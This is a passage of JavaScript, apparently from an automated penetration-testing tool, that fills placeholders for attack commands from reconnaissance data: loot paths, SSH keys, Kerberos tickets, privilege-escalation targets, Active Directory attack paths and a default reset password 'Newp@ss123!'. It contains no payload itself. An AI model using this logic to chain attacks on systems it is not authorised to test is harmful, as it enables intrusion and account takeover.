    var tgtSlash24 = (ctx.target && /^\d{1,3}(?:\.\d{1,3}){3}$/.test(String(ctx.target))) ? String(ctx.target).replace(/\.\d+$/, '.0/24') : '';
    var allDiscoveredCidrs = [];
    subCandidates.forEach(function (sc) {
      if (!sc) return;
      if (sc.cidr) allDiscoveredCidrs.push(String(sc.cidr));
      if (sc.subnet) allDiscoveredCidrs.push(String(sc.subnet));
      if (Array.isArray(sc.subnets)) sc.subnets.forEach(function (s) { if (s) allDiscoveredCidrs.push(String(s)); });
      if (Array.isArray(sc.cidrs)) sc.cidrs.forEach(function (s) { if (s) allDiscoveredCidrs.push(String(s)); });
    });
    routeVals.forEach(function (rv) {
      if (rv && rv.dst) allDiscoveredCidrs.push(String(rv.dst));
    });
    var bestCidr = allDiscoveredCidrs.find(function (c) { return c && c !== tgtSlash24; }) || allDiscoveredCidrs[0] || tgtSlash24 || '';
    if (bestCidr) {
      if (!ctx.subnet) ctx.subnet = bestCidr;
      if (!ctx.internal_subnet) ctx.internal_subnet = bestCidr;
      if (!ctx.internal_cidr) ctx.internal_cidr = bestCidr;
    }
    var arpNeighbors = fvals('scan.local.neighbors').concat(fvals('host.arp_neighbor'));
    if (arpNeighbors.length) {
      var nIps = [];
      arpNeighbors.forEach(function (n) {
        if (!n) return;
        if (n.ip && nIps.indexOf(n.ip) < 0) nIps.push(n.ip);
        if (Array.isArray(n.hosts)) n.hosts.forEach(function (h) { if (h && nIps.indexOf(h) < 0) nIps.push(h); });
        if (Array.isArray(n.neighbors)) n.neighbors.forEach(function (h) { var hip = typeof h === 'string' ? h : (h && h.ip); if (hip && nIps.indexOf(hip) < 0) nIps.push(hip); });
      });
      if (nIps.length) {
        if (!ctx.internal_host) ctx.internal_host = nIps[0];
        if (!ctx.neighbor_hosts) ctx.neighbor_hosts = nIps.join(' ');
      }
    }
    var dnsServers = fvals('scan.local.dns').concat(fvals('host.dns_server'));
    if (!ctx.dns_server) {
      var foundDns = '';
      for (var dsi = 0; dsi < dnsServers.length; dsi++) {
        var dsv = dnsServers[dsi] || {};
        if (dsv.ip) { foundDns = dsv.ip; break; }
        if (Array.isArray(dsv.servers) && dsv.servers.length) { foundDns = dsv.servers[0]; break; }
      }
      ctx.dns_server = foundDns || ctx.dc_ip || ctx.target || '';
    }
    var listenSockets = fvals('pivot.portforward_candidate').concat(fvals('scan.local.listeners')).concat(fvals('host.listen_socket')).concat(fvals('listener.open'));
    var lSockPort = '';
    function _extractPortStr(p) {
      if (p && typeof p === 'object') return String(p.port || p.local_port || p.lport || '').replace(/^.*:/, '');
      return String(p == null ? '' : p).replace(/^.*:/, '');
    }
    for (var lsi = 0; lsi < listenSockets.length; lsi++) {
      var lsv = listenSockets[lsi] || {};
      if (lsv.port || lsv.local_port) { lSockPort = _extractPortStr(lsv.port || lsv.local_port); if (lSockPort) break; }
      if (Array.isArray(lsv.ports) && lsv.ports.length) {
        var mappedPorts = lsv.ports.map(_extractPortStr).filter(Boolean);
        var pCand = mappedPorts.find(function (p) { return !/^(?:22|80|135|139|443|445|3389|5985|5986)$/.test(p); }) || mappedPorts[0] || '';
        if (pCand) { lSockPort = pCand; break; }
      }
    }
    if (lSockPort) {
      if (!ctx.listener_port) ctx.listener_port = String(lSockPort);
      if (!ctx.local_port) ctx.local_port = String(lSockPort);
    }
    if (!ctx.kali_user) ctx.kali_user = 'kali';

    // workspace output-directory tokens ({{scandir}} etc.) - from opts.workspace when the caller
    // supplies it (OBOL.workspace.tokens(eng)), else relative fallbacks so commands still form.
    ['root', 'scandir', 'lootdir', 'exploitdir', 'wwwdir', 'proofdir'].forEach(function (k) {
      if (ctx[k] === undefined && wsd[k] !== undefined) ctx[k] = wsd[k];
    });

    // Populate high-frequency service, web, keyfile, SPN, NFS, SNMP, module, and KeePass tokens
    function _resolveServicePort(defaultPort, factKinds, svcPattern) {
      var kIdx, vIdx, vals, pv, pNum;
      for (kIdx = 0; kIdx < factKinds.length; kIdx++) {
        vals = scopedValues(facts, factKinds[kIdx], tgt);
        if (!vals.length) vals = fvals(factKinds[kIdx]);
        for (vIdx = 0; vIdx < vals.length; vIdx++) {
          pv = vals[vIdx];
          pNum = pv && typeof pv === 'object' ? Number(pv.port) : NaN;
          if (pNum > 0 && pNum <= 65535) return String(pNum);
        }
      }
      if (svcPattern && localFactArr.length) {
        var hostPrefix = tgt ? ('host:' + String(tgt).toLowerCase()) : '';
        for (var pfIdx = 0; pfIdx < localFactArr.length; pfIdx++) {
          var pf = localFactArr[pfIdx];
          if (!pf || (pf.state && pf.state !== 'supported')) continue;
          if (hostPrefix && pf.scope && String(pf.scope).toLowerCase() !== hostPrefix && pf.scope !== 'host:target') continue;
          var pm = /^port:(\d+)$/.exec(pf.kind || '');
          if (pm && pf.value && svcPattern.test(String(pf.value.service || ''))) return pm[1];
        }
      }
      return String(defaultPort);
    }
    if (!ctx.ftp_port) ctx.ftp_port = _resolveServicePort(21, ['ftp.reachable', 'service.ftp', 'ftp.anonymous_login', 'ftp.banner'], /^ftp/i);
    if (!ctx.mssql_port) ctx.mssql_port = _resolveServicePort(1433, ['mssql.reachable', 'service.mssql', 'service.ms-sql-s', 'mssql.banner'], /^(?:ms-sql|mssql)/i);
    if (!ctx.rdp_port) ctx.rdp_port = _resolveServicePort(3389, ['rdp.reachable', 'service.rdp', 'service.ms-wbt-server'], /^(?:rdp|ms-wbt-server)/i);
    if (!ctx.ssh_port) ctx.ssh_port = _resolveServicePort(22, ['ssh.reachable', 'service.ssh', 'ssh.banner'], /^ssh/i);
    if (!ctx.ccache_file) {
      var krbTickets = fvals('kerberos.tickets');
      var foundCcache = '';
      for (var kti = 0; kti < krbTickets.length; kti++) {
        var ktv = krbTickets[kti] || {};
        if (ktv.ccache || ktv.file || ktv.path) { foundCcache = String(ktv.ccache || ktv.file || ktv.path); break; }
      }
      ctx.ccache_file = foundCcache || (ctx.user ? (String(ctx.user).replace(/^.*[\\/]/, '').split('@')[0] + '.ccache') : 'ticket.ccache');
    }
    if (!ctx.web_origin || !ctx.http_port || !ctx.web_port || !ctx.url) {
      var httpResps = fvals('http.response').concat(fvals('web.server')).concat(fvals('http.reachable')).concat(fvals('service.http')).concat(fvals('https.reachable')).concat(fvals('service.https'));
      var foundUrl = '', foundWebPort = '';
      for (var hri = 0; hri < httpResps.length; hri++) {
        var hv = httpResps[hri] || {};
        if (!foundUrl && (hv.url || hv.base_url)) foundUrl = String(hv.url || hv.base_url);
        if (!foundWebPort && hv.port) foundWebPort = String(hv.port);
      }
      var wo = webOrigins(facts, {
        target: tgt || ctx.target,
        defaultHost: ctx.target || ctx.hostname || '127.0.0.1',
        activities: opts.activities,
        engagement: (resolved && resolved.engagement) || opts.engagement
      });
      var primaryWo = wo && wo.primary;
      if (!ctx.web_origin && primaryWo && primaryWo.origin) ctx.web_origin = primaryWo.origin;
      if (!ctx.http_port) ctx.http_port = (primaryWo && primaryWo.port) ? String(primaryWo.port) : (foundWebPort || ctx.web_port || '80');
      if (!ctx.web_port) ctx.web_port = ctx.http_port || foundWebPort || '80';
      if (!ctx.url) {
        if (foundUrl) {
          ctx.url = foundUrl;
        } else if (ctx.web_origin) {
          ctx.url = ctx.web_origin;
        } else {
          var webHost = ctx.hostname || ctx.target || '127.0.0.1';
          var wp = ctx.web_port || '80';
          var scheme = (wp === '443' || wp === '8443') ? 'https://' : 'http://';
          var portSuffix = (wp === '80' || wp === '443') ? '' : (':' + wp);
          ctx.url = scheme + webHost + portSuffix;
        }
      }
    }
    if (!ctx.service) {
      var svcFacts = fvals('privesc.weak_service_permission').concat(fvals('privesc.unquoted_service_path')).concat(fvals('privesc.sudo_rights'));
      for (var svi = 0; svi < svcFacts.length; svi++) {
        var sv = svcFacts[svi] || {};
        var svName = sv.service || sv.name || sv.unit || (Array.isArray(sv.services) && sv.services[0]) || (Array.isArray(sv.entries) && sv.entries[0]);
        if (svName && typeof svName === 'object') {
          svName = svName.service || svName.name || svName.unit || svName.path || '';
        }
        if (svName) { ctx.service = String(svName).trim(); break; }
      }
    }
    if (!ctx.binary) {
      var sudoBins = fvals('privesc.sudo_binary');
      for (var sbi = 0; sbi < sudoBins.length; sbi++) {
        var sbv = sudoBins[sbi] || {};
        var bName = sbv.binary || sbv.bin || (Array.isArray(sbv.binaries) && sbv.binaries[0]);
        if (bName) { ctx.binary = String(bName).trim(); break; }
      }
      if (!ctx.binary && ctx.suid_binary) ctx.binary = ctx.suid_binary;
    }
    if (!ctx.kernel) {
      var kernFacts = fvals('host.kernel').concat(fvals('privesc.kernel_candidate'));
      if (kernFacts[0] && (kernFacts[0].kernel || kernFacts[0].version || kernFacts[0].release)) {
        ctx.kernel = String(kernFacts[0].kernel || kernFacts[0].version || kernFacts[0].release).trim();
      }
    }
    if (!ctx.sid) {
      var oraSids = fvals('oracle.sid');
      if (oraSids[0] && (oraSids[0].sid || oraSids[0].name)) ctx.sid = String(oraSids[0].sid || oraSids[0].name);
      else if (ctx.domain_sid) ctx.sid = ctx.domain_sid;
    }
    if (!ctx.keyfile && !ctx.key_file) {
      var sshKeys = fvals('loot.ssh_key').concat(fvals('credential.ssh_key')).concat(fvals('ssh.private_key')).concat(fvals('credential.certificate'));
      var kf = '';
      for (var ski = 0; ski < sshKeys.length; ski++) {
        var skv = sshKeys[ski] || {};
        var skCandidate = skv.ssh_key_path || skv.sshKeyPath || skv.keyPath || skv.key_path || skv.path || skv.file || skv.keyfile;
        if (skCandidate) { kf = String(skCandidate); break; }
      }
      if (kf) {
        ctx.keyfile = kf;
        ctx.key_file = kf;
      }
    } else if (ctx.keyfile && !ctx.key_file) {
      ctx.key_file = ctx.keyfile;
    } else if (ctx.key_file && !ctx.keyfile) {
      ctx.keyfile = ctx.key_file;
    }
    if (!ctx.cert_file && ctx.pfx) {
      ctx.cert_file = ctx.pfx;
    }
    if (!ctx.spn_host) {
      var delFacts = fvals('ad.delegation').concat(fvals('ad.rbcd')).concat(fvals('ad.unconstrained'));
      for (var dli = 0; dli < delFacts.length; dli++) {
        var dlv = delFacts[dli] || {};
        var spnTgt = dlv.target || dlv.spn_host || (dlv.spn ? String(dlv.spn).split('/')[1] : '');
        if (spnTgt) { ctx.spn_host = String(spnTgt); break; }
      }
      if (!ctx.spn_host && (ctx.dc_fqdn || ctx.hostname || ctx.target)) {
        ctx.spn_host = ctx.dc_fqdn || ctx.hostname || ctx.target;
      }
    }
    if (!ctx.export) {
      var nfsEx = fvals('nfs.exports').concat(fvals('privesc.nfs_no_root_squash'));
      for (var nfi = 0; nfi < nfsEx.length; nfi++) {
        var nfv = nfsEx[nfi] || {};
        if (nfv.path || nfv.export || (Array.isArray(nfv.exports) && nfv.exports[0])) {
          ctx.export = String(nfv.path || nfv.export || nfv.exports[0]);
          break;
        }
      }
    }
    if (!ctx.community) {
      var snmpCom = fvals('snmp.community');
      if (snmpCom[0] && (snmpCom[0].community || snmpCom[0].value)) ctx.community = String(snmpCom[0].community || snmpCom[0].value);
    }
    if (!ctx.module) {
      var modFacts = fvals('rsync.modules').concat(fvals('privesc.script_sink')).concat(fvals('privesc.python_hijack'));
      for (var mdi = 0; mdi < modFacts.length; mdi++) {
        var mdv = modFacts[mdi] || {};
        if (mdv.module || mdv.name || (Array.isArray(mdv.modules) && mdv.modules[0])) {
          ctx.module = String(mdv.module || mdv.name || mdv.modules[0]);
          break;
        }
      }
    }
    if (!ctx.kdbx_file) {
      var kdbxFacts = fvals('loot.keepass_dump').concat(fvals('loot.files'));
      for (var kbi = 0; kbi < kdbxFacts.length; kbi++) {
        var kbv = kdbxFacts[kbi] || {};
        var kbPath = kbv.path || kbv.file || (Array.isArray(kbv.files) ? kbv.files.find(function (f) { return /\.kdbx$/i.test(String(f)); }) : '');
        if (kbPath && /\.kdbx$/i.test(String(kbPath))) { ctx.kdbx_file = String(kbPath); break; }
      }
    }
    if (!ctx.task_name || !ctx.task_target) {
      var schFacts = fvals('privesc.scheduled_task').concat(fvals('privesc.script_sink'));
      for (var sti = 0; sti < schFacts.length; sti++) {
        var stv = schFacts[sti] || {};
        if (!ctx.task_name && (stv.task_name || stv.taskName || stv.name || stv.task)) ctx.task_name = String(stv.task_name || stv.taskName || stv.name || stv.task).trim();
        if (!ctx.task_target && (stv.task_target || stv.taskTarget || stv.target || stv.path || stv.binary || stv.script)) ctx.task_target = String(stv.task_target || stv.taskTarget || stv.target || stv.path || stv.binary || stv.script).trim();
      }
    }
    if (!ctx.dll_name || !ctx.dll_path) {
      var dllFacts = fvals('privesc.dll_hijack');
      for (var dhi = 0; dhi < dllFacts.length; dhi++) {
        var dhv = dllFacts[dhi] || {};
        if (!ctx.dll_name && (dhv.dll_name || dhv.dllName || dhv.dll || dhv.name)) ctx.dll_name = String(dhv.dll_name || dhv.dllName || dhv.dll || dhv.name).trim().replace(/\.dll$/i, '');
        if (!ctx.dll_path && (dhv.dll_path || dhv.dllPath || dhv.dir || dhv.path)) ctx.dll_path = String(dhv.dll_path || dhv.dllPath || dhv.dir || dhv.path).trim();
      }
    }
    if (!ctx.clsid) {
      var comFacts = fvals('privesc.com_hijack');
      if (comFacts[0] && (comFacts[0].clsid || comFacts[0].id)) ctx.clsid = String(comFacts[0].clsid || comFacts[0].id).trim();
    }
    if (!ctx.pipe_name) {
      var pipeFacts = fvals('privesc.named_pipe');
      if (pipeFacts[0] && (pipeFacts[0].pipe_name || pipeFacts[0].pipe || pipeFacts[0].name)) ctx.pipe_name = String(pipeFacts[0].pipe_name || pipeFacts[0].pipe || pipeFacts[0].name).trim().replace(/^\\\\\.\\pipe\\/i, '');
    }
    if (!ctx.unit || !ctx.unit_path) {
      var unitFacts = fvals('privesc.systemd_timer').concat(fvals('privesc.weak_service_permission'));
      for (var uni = 0; uni < unitFacts.length; uni++) {
        var unv = unitFacts[uni] || {};
        if (!ctx.unit && (unv.unit || unv.service || unv.name)) ctx.unit = String(unv.unit || unv.service || unv.name).trim();
        if (!ctx.unit_path && (unv.unit_path || unv.unitPath || unv.path)) ctx.unit_path = String(unv.unit_path || unv.unitPath || unv.path).trim();
      }
    }
    if (!ctx.writable_dir) {
      var wdFacts = fvals('privesc.wildcard_injection').concat(fvals('privesc.writable_dir')).concat(fvals('privesc.script_sink'));
      for (var wdi = 0; wdi < wdFacts.length; wdi++) {
        var wdv = wdFacts[wdi] || {};
        if (wdv.writable_dir || wdv.writableDir || wdv.dir || wdv.directory || wdv.path) {
          ctx.writable_dir = String(wdv.writable_dir || wdv.writableDir || wdv.dir || wdv.directory || wdv.path).trim();
          break;
        }
      }
    }
    if (!ctx.script_path || !ctx.script_dir) {
      var pyFacts = fvals('privesc.python_hijack').concat(fvals('privesc.script_sink')).concat(fvals('privesc.cron_writable'));
      for (var pyi = 0; pyi < pyFacts.length; pyi++) {
        var pyv = pyFacts[pyi] || {};
        var spCand = pyv.script_path || pyv.scriptPath || pyv.script || pyv.path || pyv.file || '';
        var sdCand = pyv.script_dir || pyv.scriptDir || pyv.dir || pyv.directory || '';
        if (!ctx.script_path && spCand) ctx.script_path = String(spCand).trim();
        if (!ctx.script_dir && sdCand) ctx.script_dir = String(sdCand).trim();
        if (!ctx.script_dir && ctx.script_path && ctx.script_path.indexOf('/') >= 0) {
          ctx.script_dir = ctx.script_path.slice(0, ctx.script_path.lastIndexOf('/')) || '/';
        }
      }
    }
    if (!ctx.socket_path) {
      var sockFacts = fvals('privesc.screen_socket').concat(fvals('privesc.tmux_socket'));
      if (sockFacts[0] && (sockFacts[0].socket_path || sockFacts[0].path || sockFacts[0].socket)) {
        ctx.socket_path = String(sockFacts[0].socket_path || sockFacts[0].path || sockFacts[0].socket).trim();
      }
    }
    if (!ctx.vhd_path) {
      var vhdFacts = fvals('loot.vhd').concat(fvals('loot.backup_files')).concat(fvals('loot.files'));
      for (var vhi = 0; vhi < vhdFacts.length; vhi++) {
        var vhv = vhdFacts[vhi] || {};
        var vhdCand = vhv.vhd_path || vhv.path || vhv.file || (Array.isArray(vhv.files) ? vhv.files.find(function (f) { return /\.(?:vhd|vhdx|vmdk)$/i.test(String(f)); }) : '');
        if (vhdCand && /\.(?:vhd|vhdx|vmdk)$/i.test(String(vhdCand))) { ctx.vhd_path = String(vhdCand).trim(); break; }
      }
    }
    if (!ctx.db_file) {
      var dbFileFacts = fvals('db.sqlite_file').concat(fvals('loot.files'));
      for (var dbfi = 0; dbfi < dbFileFacts.length; dbfi++) {
        var dbfv = dbFileFacts[dbfi] || {};
        var dbfCand = dbfv.db_file || dbfv.path || dbfv.file || (Array.isArray(dbfv.files) ? dbfv.files.find(function (f) { return /\.(?:db|sqlite|sqlite3)$/i.test(String(f)); }) : '');
        if (dbfCand && /\.(?:db|sqlite|sqlite3)$/i.test(String(dbfCand))) { ctx.db_file = String(dbfCand).trim(); break; }
      }
    }
    if (!ctx.database) {
      var dbFacts = fvals('db.mysql_databases').concat(fvals('db.postgres_databases')).concat(fvals('db.mssql_databases')).concat(fvals('db.databases'));
      for (var dbi = 0; dbi < dbFacts.length; dbi++) {
        var dbv = dbFacts[dbi] || {};
        var dbList = Array.isArray(dbv.databases) ? dbv.databases : (dbv.database ? [dbv.database] : []);
        var pickDb = dbList.find(function (d) { return d && !/^(?:information_schema|performance_schema|sys|mysql|postgres|template0|template1|master|tempdb|model|msdb)$/i.test(String(d)); }) || dbList[0];
        if (pickDb) { ctx.database = String(pickDb).trim(); break; }
      }
    }
    if (!ctx.gmsa_account) {
      var gmsaFacts = fvals('ad.gmsa');
      if (gmsaFacts[0] && (gmsaFacts[0].gmsa_account || gmsaFacts[0].account || gmsaFacts[0].name || gmsaFacts[0].sam)) {
        ctx.gmsa_account = String(gmsaFacts[0].gmsa_account || gmsaFacts[0].account || gmsaFacts[0].name || gmsaFacts[0].sam).trim().replace(/\$$/, '');
      }
    }
    if (!ctx.gpo_id) {
      var gpoFacts = fvals('ad.gpo_control');
      if (gpoFacts[0] && (gpoFacts[0].gpo_id || gpoFacts[0].id || gpoFacts[0].guid)) {
        ctx.gpo_id = String(gpoFacts[0].gpo_id || gpoFacts[0].id || gpoFacts[0].guid).trim();
      }
    }
    if ((ctx.group === undefined || ctx.group === '') && facts && facts.has && (facts.has('ad.acl_lead') || facts.has('ad.attack_paths') || facts.has('ad.control_paths'))) {
      ctx.group = 'Domain Admins';
    }
    if ((ctx.target_sam === undefined || ctx.target_sam === '') && facts && facts.has && (facts.has('ad.acl_lead') || facts.has('ad.attack_paths') || facts.has('ad.control_paths'))) {
      ctx.target_sam = ctx.group || ctx.user || 'Administrator';
    }
    if (!ctx.new_password) {
      ctx.new_password = (params && params.new_password) || 'Newp@ss123!';
    }
    if (!ctx.target_user) {
      var KNOWN_GROUPS = {
        'domain admins': 1, 'enterprise admins': 1, 'administrators': 1,
        'exchange windows permissions': 1, 'account operators': 1, 'organization management': 1,
        'backup operators': 1, 'server operators': 1, 'dnsadmins': 1, 'print operators': 1,
        'group policy creator owners': 1, 'key admins': 1, 'enterprise key admins': 1,
        'domain users': 1, 'remote management users': 1, 'remote desktop users': 1
      };
      var curUserLower = String(ctx.user || ctx.username || '').toLowerCase();
      var _isUserTarget = function (cand) {
        var s = String(cand || '').trim().replace(/@.*$/, '');
        if (!s || s.indexOf(' ') >= 0 || s.charAt(s.length - 1) === '$') return false;
        var sl = s.toLowerCase();
        if (KNOWN_GROUPS[sl] || sl === curUserLower || sl === 'krbtgt' || sl === 'guest' || sl === 'defaultaccount') return false;
        if (ctx.dc_netbios && sl === String(ctx.dc_netbios).toLowerCase()) return false;
        if (ctx.hostname && sl === String(ctx.hostname).split('.')[0].toLowerCase()) return false;
        return true;
      };
      var pickedUser = '';
      var aclVals = fvals('ad.acl_lead');
      for (var aui = 0; aui < aclVals.length && !pickedUser; aui++) {
        var atgts = (aclVals[aui] && aclVals[aui].targets) || [];
        for (var auj = 0; auj < atgts.length; auj++) {
          if (_isUserTarget(atgts[auj])) { pickedUser = String(atgts[auj]).trim().replace(/@.*$/, ''); break; }
        }
      }
      if (!pickedUser) {
        var apVals = fvals('ad.attack_paths');
        for (var api = 0; api < apVals.length && !pickedUser; api++) {
          var faObj = (apVals[api] && (apVals[api].first_abuse || apVals[api].first_action)) || {};
          if ((!faObj.kind || faObj.kind === 'user' || faObj.kind === 'object') && _isUserTarget(faObj.target)) {
            pickedUser = String(faObj.target).trim().replace(/@.*$/, '');
            break;
          }
        }
      }
      if (!pickedUser) {
        var ulVals = fvals('ad.user_list');
        for (var uli = 0; uli < ulVals.length && !pickedUser; uli++) {
          var ulist = (ulVals[uli] && ulVals[uli].users) || [];
          for (var ulj = 0; ulj < ulist.length; ulj++) {
            if (_isUserTarget(ulist[ulj])) { pickedUser = String(ulist[ulj]).trim().replace(/@.*$/, ''); break; }
          }
        }
      }
      ctx.target_user = pickedUser || 'Administrator';
    }
    if (!ctx.edb_id || !ctx.edb_file || !ctx.edb_path) {
      var edbItems = [];
      fvals('exploit.script_inspected').concat(fvals('exploit.edb_candidate')).forEach(function (ev) {
        if (!ev || typeof ev !== 'object') return;
        edbItems.push(ev);
        ['candidates', 'exploits', 'matches'].forEach(function (arrKey) {
          if (Array.isArray(ev[arrKey])) {
            ev[arrKey].forEach(function (sub) { if (sub && typeof sub === 'object') edbItems.push(sub); });
          }
        });
      });
      var foundEdbId = ctx.edb_id ? String(ctx.edb_id).trim() : '';
      var foundEdbFile = ctx.edb_file ? String(ctx.edb_file).trim() : '';
      var foundEdbPath = ctx.edb_path ? String(ctx.edb_path).trim() : '';
      var foundEdbExt = '';
      for (var edi = 0; edi < edbItems.length; edi++) {
        var edv = edbItems[edi];
        var rawEdbId = edv.edb_id || edv.edbId || edv.exploit_id || edv.id || '';
        var normEdbId = rawEdbId ? String(rawEdbId).trim().replace(/^edb(?:-id)?[:\s-]*/i, '') : '';
        var rawEdbPath = edv.edb_path || edv.edbPath || edv.full_path || edv.fullPath || edv.script_path || edv.path || '';
        var rawEdbFile = edv.edb_file || edv.edbFile || edv.filename || edv.file || edv.script || '';
        if (!rawEdbPath && rawEdbFile && /[\\\/]/.test(String(rawEdbFile))) rawEdbPath = String(rawEdbFile);
        var cleanEdbFile = rawEdbFile ? String(rawEdbFile).trim().replace(/^.*[\\\/]/, '') : '';
        if (!cleanEdbFile && rawEdbPath) cleanEdbFile = String(rawEdbPath).trim().replace(/^.*[\\\/]/, '');
        if (!normEdbId && cleanEdbFile) {
          var idMatch = /^(?:edb[_-]?)?(\d{3,7})(?:\.[A-Za-z0-9]+)?$/i.exec(cleanEdbFile);
          if (idMatch) normEdbId = idMatch[1];
        }
        if (!foundEdbId && normEdbId) foundEdbId = normEdbId;
        var isGenericEdbFallback = /^exploit\.[A-Za-z0-9]+$/i.test(cleanEdbFile);
        if ((!foundEdbFile || (/^exploit\.[A-Za-z0-9]+$/i.test(foundEdbFile) && !isGenericEdbFallback)) && cleanEdbFile && (!foundEdbId || !normEdbId || normEdbId === foundEdbId)) foundEdbFile = cleanEdbFile;
        if (!foundEdbPath && rawEdbPath && !/^exploit\.[A-Za-z0-9]+$/i.test(String(rawEdbPath).trim()) && (!foundEdbId || !normEdbId || normEdbId === foundEdbId)) foundEdbPath = String(rawEdbPath).trim();
        if (!foundEdbExt && (edv.ext || edv.extension)) foundEdbExt = String(edv.ext || edv.extension).trim().replace(/^\./, '');
      }
      if (!foundEdbPath) {
        for (var edp = 0; edp < edbItems.length; edp++) {
          var epVal = edbItems[edp].edb_path || edbItems[edp].edbPath || edbItems[edp].full_path || edbItems[edp].fullPath || edbItems[edp].script_path || edbItems[edp].path || '';
          if (epVal) { foundEdbPath = String(epVal).trim(); break; }
        }
      }
      if (!foundEdbFile && foundEdbPath) foundEdbFile = foundEdbPath.replace(/^.*[\\\/]/, '');
      if (!foundEdbFile && foundEdbId && foundEdbExt) foundEdbFile = foundEdbId + '.' + foundEdbExt;
      if (!foundEdbPath && foundEdbFile) foundEdbPath = foundEdbFile;
      if (!ctx.edb_id && foundEdbId) ctx.edb_id = foundEdbId;
      if (!ctx.edb_file && foundEdbFile) ctx.edb_file = foundEdbFile;
      if (!ctx.edb_path && foundEdbPath) ctx.edb_path = foundEdbPath;
    }
    if (!ctx.custom_bin) {
      var cbItems = [];
      fvals('privesc.custom_binary').concat(fvals('host.custom_artifact')).forEach(function (cv) {
        if (!cv) return;
        if (typeof cv === 'string') { cbItems.push(cv); return; }
        cbItems.push(cv);
        ['binaries', 'artifacts', 'paths', 'files', 'items'].forEach(function (ak) {
          if (Array.isArray(cv[ak])) cv[ak].forEach(function (sub) { if (sub) cbItems.push(sub); });
        });
      });
      for (var cbi = 0; cbi < cbItems.length; cbi++) {
        var cbv = cbItems[cbi];
        var cbPick = typeof cbv === 'string'
          ? cbv
          : (cbv.custom_bin || cbv.customBin || cbv.path || cbv.full_path || cbv.fullPath || cbv.file || cbv.artifact || cbv.exe || cbv.binary || cbv.bin || cbv.command || cbv.target || cbv.name || '');
        if (cbPick && String(cbPick).trim()) { ctx.custom_bin = String(cbPick).trim(); break; }
      }
    }
    if (!ctx.suid_bin) {
      var sbItems = [];
      fvals('privesc.suid').concat(fvals('privesc.suid_candidate')).forEach(function (sv) {
        if (!sv) return;
        if (typeof sv === 'string') { sbItems.push(sv); return; }
        sbItems.push(sv);
        ['paths', 'binaries', 'files', 'items'].forEach(function (ak) {
          if (Array.isArray(sv[ak])) sv[ak].forEach(function (sub) { if (sub) sbItems.push(sub); });
        });
      });
      for (var sbi = 0; sbi < sbItems.length; sbi++) {
        var sbv = sbItems[sbi];
        var sbPick = typeof sbv === 'string'
          ? sbv
          : (sbv.suid_bin || sbv.suidBin || sbv.path || sbv.full_path || sbv.fullPath || sbv.file || sbv.binary || sbv.bin || '');
        if (sbPick && String(sbPick).trim()) { ctx.suid_bin = String(sbPick).trim(); break; }
      }
    }
    var svcBinFacts = fvals('host.service_binary');
    for (var sbfi = 0; sbfi < svcBinFacts.length; sbfi++) {
      var sbf = svcBinFacts[sbfi] || {};
      var sbfDir = String(sbf.bin_dir || sbf.binDir || sbf.dir || '').trim();
      var sbfSvc = String(sbf.service || '').toLowerCase();
      if (sbfDir) {
        if ((sbfSvc === 'mysql' || sbfSvc === 'mariadb') && !ctx.mysql_bin_dir) ctx.mysql_bin_dir = sbfDir;
        if ((sbfSvc === 'postgresql' || sbfSvc === 'postgres') && !ctx.psql_bin_dir) ctx.psql_bin_dir = sbfDir;
      }
    }
    if (!ctx.source_path || !ctx.app_base_path) {
      var srcItems = [];
      fvals('web.source_disclosed').concat(fvals('web.manifest_disclosed')).concat(fvals('config.review')).forEach(function (sv) {
        if (!sv) return;
        if (typeof sv === 'string') { srcItems.push({ path: sv }); return; }
        srcItems.push(sv);
        ['paths', 'files', 'manifests', 'items'].forEach(function (ak) {
          if (Array.isArray(sv[ak])) {
            sv[ak].forEach(function (sub) {
              if (!sub) return;
              srcItems.push(typeof sub === 'string' ? { path: sub } : sub);
            });
          }
        });
      });
      fvals('exploit.script_inspected').concat(fvals('http.path')).forEach(function (hv) {
        if (!hv || typeof hv !== 'object') return;
        if (hv.source_path || hv.sourcePath || hv.manifest_path || hv.manifestPath || hv.app_base_path || hv.appBasePath) {
          srcItems.push(hv);
        }
      });
      var foundSrcPath = ctx.source_path ? String(ctx.source_path).trim() : '';
      var foundBasePath = ctx.app_base_path ? String(ctx.app_base_path).trim() : '';
      for (var sri = 0; sri < srcItems.length; sri++) {
        var srv = srcItems[sri];
        if (!foundSrcPath) {
          var rawSp = srv.source_path || srv.sourcePath || srv.manifest_path || srv.manifestPath || srv.target_path || srv.remote_path || srv.file_path || srv.path || srv.file || srv.uri || srv.endpoint || srv.url || '';
          if (rawSp && String(rawSp).trim()) {
            var spClean = String(rawSp).trim();
            var urlPathMatch = /^https?:\/\/[^\/]+(\/.*)$/i.exec(spClean);
            if (urlPathMatch) spClean = urlPathMatch[1];
            else if (/^https?:\/\/[^\/]+$/i.test(spClean)) spClean = '/';
            foundSrcPath = spClean;
          }
        }
        if (!foundBasePath) {
          var rawBp = srv.app_base_path || srv.appBasePath || srv.base_path || srv.basePath || srv.app_root || srv.appRoot || srv.docroot || srv.webroot || srv.root_dir || srv.dir || srv.directory || '';
          if (rawBp && String(rawBp).trim()) foundBasePath = String(rawBp).trim();
        }
        if (foundSrcPath && foundBasePath) break;
      }
      if (!foundBasePath && foundSrcPath) {
        if (foundSrcPath.indexOf('/') >= 0) {
          var trimmedSp = foundSrcPath.replace(/\/+$/, '');
          var lastSlash = trimmedSp.lastIndexOf('/');
          foundBasePath = lastSlash > 0 ? trimmedSp.slice(0, lastSlash) : '/';
        } else if (foundSrcPath.indexOf('\\') >= 0) {
          var trimmedWin = foundSrcPath.replace(/\\+$/, '');
          var lastBs = trimmedWin.lastIndexOf('\\');
          if (lastBs > 0) foundBasePath = trimmedWin.slice(0, lastBs);
        } else {
          foundBasePath = '/';
        }
      }
      if (!ctx.source_path && foundSrcPath) ctx.source_path = foundSrcPath;
      if (!ctx.app_base_path && foundBasePath) ctx.app_base_path = foundBasePath;
    }
    if (!ctx.ssh_key_path) {
      var keyItems = [];
      fvals('loot.ssh_key').concat(fvals('credential.ssh_key')).concat(fvals('ssh.private_key')).forEach(function (kv) {
        if (kv) keyItems.push(typeof kv === 'string' ? { path: kv } : kv);
      });
      fvals('credential.reuse_candidate').forEach(function (rv) {
        if (rv && (rv.ssh_key_path || rv.sshKeyPath || rv.keyPath || rv.key_path || rv.keyfile)) keyItems.push(rv);
      });
      fvals('credential.certificate').forEach(function (cv) {
        if (cv && (cv.kind === 'private_key' || cv.ssh_key_path || cv.sshKeyPath || cv.keyPath || cv.key_path || cv.keyfile)) keyItems.push(cv);
      });
      if (keyItems.length) {
        var pickedKeyPath = '';
        var pickedKeyUser = '';
